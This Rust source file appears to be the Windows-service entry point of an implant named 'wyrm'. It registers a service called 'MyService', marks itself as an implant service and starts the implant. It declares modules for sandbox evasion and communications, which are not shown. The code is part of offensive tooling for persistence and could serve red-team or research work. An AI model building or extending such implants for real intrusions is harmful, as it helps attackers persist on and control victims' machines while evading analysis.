#![feature(string_remove_matches)]
#![feature(core_float_math)]
#![feature(const_option_ops)]
#![feature(const_trait_impl)]

use std::sync::atomic::Ordering;

use entry::start_wyrm;
use windows_sys::{
    Win32::{
        Foundation::FALSE,
        System::Services::{
            RegisterServiceCtrlHandlerW, SERVICE_CONTROL_STOP, SERVICE_RUNNING,
            SERVICE_TABLE_ENTRYW, StartServiceCtrlDispatcherW,
        },
    },
    core::PWSTR,
    w,
};

use crate::{
    entry::IS_IMPLANT_SVC,
    utils::svc_controls::{SERVICE_HANDLE, SERVICE_STOP_EVENT, update_service_status},
};

mod anti_sandbox;
mod comms;
mod entry;
mod native;
mod utils;
mod wyrm;

#[unsafe(no_mangle)]
pub unsafe extern "system" fn ServiceMain(_: u32, _: *mut PWSTR) {
    svc_start();
}

fn svc_start() {
    // register the service with SCM
    let h_svc = unsafe { RegisterServiceCtrlHandlerW(w!("MyService"), Some(service_handler)) };
    if h_svc.is_null() {
        return;
    }

    IS_IMPLANT_SVC.store(true, Ordering::SeqCst);
    SERVICE_HANDLE.store(h_svc, Ordering::SeqCst);

    unsafe { update_service_status(h_svc, SERVICE_RUNNING) }

    start_wyrm();
}

unsafe extern "system" fn service_handler(control: u32) {
    match control {
        SERVICE_CONTROL_STOP => {
            SERVICE_STOP_EVENT.store(true, Ordering::SeqCst);
        }
        _ => {}
    }
}

fn main() {
    let mut service_name: Vec<u16> = "MyService\0".encode_utf16().collect();

    let service_table = [
        SERVICE_TABLE_ENTRYW {
            lpServiceName: PWSTR::from(service_name.as_mut_ptr()),
            lpServiceProc: Some(ServiceMain),
        },
        SERVICE_TABLE_ENTRYW::default(),
    ];

    unsafe {
        if StartServiceCtrlDispatcherW(service_table.as_ptr()) == FALSE {
            return;
        }
    }
}
